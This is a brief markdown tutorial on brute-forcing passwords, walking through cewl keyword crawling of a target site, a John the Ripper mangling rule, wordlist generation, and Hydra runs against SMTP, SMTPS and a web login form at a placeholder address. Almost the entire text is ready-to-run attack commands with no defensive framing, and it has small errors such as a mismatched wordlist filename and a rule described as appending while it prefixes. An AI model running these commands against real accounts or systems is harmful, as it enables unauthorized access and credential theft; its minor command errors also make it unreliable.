# Example Bruce Force Password Attack
How to generate a password list using custom rules for use in brute force attacks.

## Step 1: Crawl Website for Keywords
Crawl the website using `cewl` . This command will search for words at least 8 characters long, and save the output to `target.lst`.

`cewl -m 8 -w target.list https://target.com`

## Step 2: Add Password Rules
If you know the company enforces a password policy you can start to write your own rules using `john the ripper`. The following rule will take a password list and append a special character to the begining.

/opt/john/john.conf
```
[List.Rules:xxx]
Az"[0-9][0-9]" ^[!@]
```
## Step 3: Genrate a Wordlist
Use john the ripper to generate a wordlist using the rule you created.

`john --wordlist=target.lst -rules=rulename --stdout > results.txt`

## Step 4: Bruce Force With Hydra
Perform a simple brute force on an ip.

`hydra -l username@email.com -P results.txt smtp://10.10.10.10:25`
`hydra -l username@email.com -P results.txt smtps://10.10.10.10:465`

## Attack Web Page
`hydra -l username -P results.txt 10.10.10.10 http-get-form "form.php:username=^USER^&password=^PASS^:logout.php" -f
If you know the username you can specify it with `-l username`
You will need to analyze the web page for indicators of success and failures. Enter them in the success or fail conditions
`S=logout.php`
`F=failed`
`-f` Stop after password found.
